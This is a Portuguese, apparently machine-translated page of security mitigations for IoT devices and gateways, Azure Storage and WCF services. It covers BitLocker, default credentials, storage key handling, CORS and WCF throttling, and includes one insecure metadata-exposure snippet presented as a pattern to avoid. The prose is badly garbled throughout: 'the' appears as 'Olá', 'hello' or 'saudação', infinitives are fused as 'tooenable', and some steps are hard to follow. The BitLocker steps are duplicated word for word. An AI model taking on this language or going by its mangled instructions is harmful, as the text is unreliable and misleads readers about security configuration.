| **Etapas** | Windows 10 IoT Core implementa uma versão leve do Cofre de bit criptografia do dispositivo, que tem uma dependência forte presença de saudação do TPM na plataforma hello, incluindo protocolo preOS necessário de saudação em UEFI que conduz medidas necessárias hello. Essas medidas preOS Certifique-se de que Olá que sistema operacional posterior tem um registro definitivo de como Olá SO foi iniciado. Criptografe partições de sistema operacional usando o Cofre de bits e quaisquer outras partições também caso eles armazenam dados confidenciais. |

## <a id="min-enable"></a>Certifique-se de que somente Olá mínimo serviços/recursos estão habilitados em dispositivos

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Não ativar ou desativar todos os recursos ou serviços em Olá sistema operacional que não seja necessária para Olá funcionamento da solução hello. Para, por exemplo, se Olá dispositivo não exigir um toobe de interface do usuário implantado, instale o Windows IoT Core no modo sem cabeçalho. |

## <a id="field-bit-locker"></a>Criptografar o sistema operacional e partições adicionais do Gateway de Campo IoT com o BitLocker

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Campo de IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Windows 10 IoT Core implementa uma versão leve do Cofre de bit criptografia do dispositivo, que tem uma dependência forte presença de saudação do TPM na plataforma hello, incluindo protocolo preOS necessário de saudação em UEFI que conduz medidas necessárias hello. Essas medidas preOS Certifique-se de que Olá que sistema operacional posterior tem um registro definitivo de como Olá SO foi iniciado. Criptografe partições de sistema operacional usando o Cofre de bits e quaisquer outras partições também caso eles armazenam dados confidenciais. |

## <a id="default-change"></a>Certifique-se de que as credenciais de logon padrão saudação do gateway de campo Olá sejam alteradas durante a instalação

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Campo de IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Certifique-se de que as credenciais de logon padrão saudação do gateway de campo Olá sejam alteradas durante a instalação |

## <a id="cloud-firmware"></a>Certifique-se de que esse Gateway de nuvem Olá implementa um firmware de dispositivos do processo tookeep Olá conectado backup toodate

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Nuvem IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Opção de gateway - Hub IoT do Azure |
| **Referências**              | [Visão geral do gerenciamento de dispositivo Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [como tooupdate Firmware do dispositivo](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Etapas** | LWM2M é um protocolo de saudação Open Mobile Alliance para gerenciamento de dispositivo IoT. Gerenciamento de dispositivo IoT do Azure permite toointeract com dispositivos físicos usando trabalhos de dispositivo. Certifique-se de que esse Gateway de nuvem Olá implementa um dispositivo de saudação do processo tooroutinely manter e outros dados de configuração de backup toodate usando o gerenciamento de dispositivos do Azure IoT Hub. |

## <a id="controls-policies"></a>Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de Confiança de Máquina | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Certifique-se de que os dispositivos tenham controles de segurança de ponto de extremidade, como o BitLocker, para criptografia no nível do disco, um antivírus com assinaturas atualizadas, um firewall baseado em host, atualizações de sistema operacional, políticas de grupo, etc., e que eles estejam configurados de acordo com as políticas de segurança organizacionais. |

## <a id="secure-keys"></a>Garantir o gerenciamento seguro das chaves de acesso do Armazenamento do Azure

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Guia de segurança do Armazenamento do Azure - Gerenciando as chaves da conta de armazenamento](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Etapas** | <p>Armazenamento de chaves: Ele é recomendado chaves de acesso de armazenamento do Azure toostore Olá no cofre de chaves do Azure como um segredo e ter aplicativos Olá recuperar a chave de saudação do Cofre de chaves. Isso é recomendado devido toohello seguintes motivos:</p><ul><li>aplicativo Hello nunca terá Olá armazenamento chave codificado em um arquivo de configuração, que remove essa via de alguém obtendo toohello chaves sem permissão de acesso</li><li>Chaves de acesso de toohello podem ser controladas usando o Active Directory do Azure. Isso significa que um proprietário de conta pode conceder a série de toohello de acesso de aplicativos que precisam de tooretrieve chaves de saudação do Cofre de chaves do Azure. Outros aplicativos não será capaz de tooaccess chaves de saudação sem conceder permissão especificamente</li><li>Regeneração da chave: É recomendável toohave um processo em vigor tooregenerate acesso de armazenamento do Azure chaves por motivos de segurança. Artigo de referência de obter detalhes sobre por que e como tooplan para a regeneração da chave são documentados em Olá guia de segurança de armazenamento do Azure</li></ul>|

## <a id="cors-storage"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado no Armazenamento do Azure

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Suporte a CORS Olá serviços de armazenamento do Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Etapas** | Armazenamento do Azure permite que você tooenable CORS – entre o compartilhamento de recursos de origem. Para cada conta de armazenamento, você pode especificar os domínios que podem acessar recursos de saudação na conta de armazenamento. Por padrão, o CORS está desabilitado em todos os serviços Você pode habilitar o CORS usando Olá API REST ou hello armazenamento cliente biblioteca toocall uma saudação métodos tooset Olá políticas de QoS. |

## <a id="throttling"></a>Habilitar o recurso de limitação do serviço WCF

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Etapas** | <p>Não colocar um limite no hello o uso de recursos podem resultar em um esgotamento de recursos e, finalmente, uma negação de serviço do sistema.</p><ul><li>**EXPLICAÇÃO:** Windows Communication Foundation (WCF) oferece Olá solicitações de serviço de toothrottle de capacidade. Permitir muitas solicitações de clientes pode sobrecarregar o sistema e esgotar seus recursos. Em Olá outro lado, permitindo que somente um pequeno número de solicitações de serviço tooa pode impedir que usuários legítimos usando o serviço de saudação. Cada serviço deve ser ajustado individualmente tooand configurado tooallow Olá apropriado quantidade de recursos.</li><li>**RECOMENDAÇÕES** Habilite o recurso de limitação de serviços do WCF e defina os limites apropriados para o aplicativo.</li></ul>|

### <a name="example"></a>Exemplo
a seguir Olá é um exemplo de configuração com a limitação habilitado:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Divulgação de informações do WCF por meio de metadados

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Etapas** | Metadados podem ajudar os invasores Saiba mais sobre o sistema hello e planejar uma forma de ataque. Serviços WCF podem ser configurado tooexpose metadados. que fornecem informações descritivas detalhadas do serviço e que não devem ser transmitidos em ambientes de produção. Olá `HttpGetEnabled`  /  `HttpsGetEnabled` propriedades da classe de ServiceMetaData Olá define se um serviço irá expor metadados Olá | 

### <a name="example"></a>Exemplo
código de saudação abaixo instrui WCF toobroadcast metadados do serviço
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não transmita os metadados de um serviço em um ambiente de produção. Definir Olá HttpGetEnabled / propriedades HttpsGetEnabled de saudação ServiceMetaData classe toofalse. 

### <a name="example"></a>Exemplo
código de saudação abaixo instrui WCF toonot difusão metadados do serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
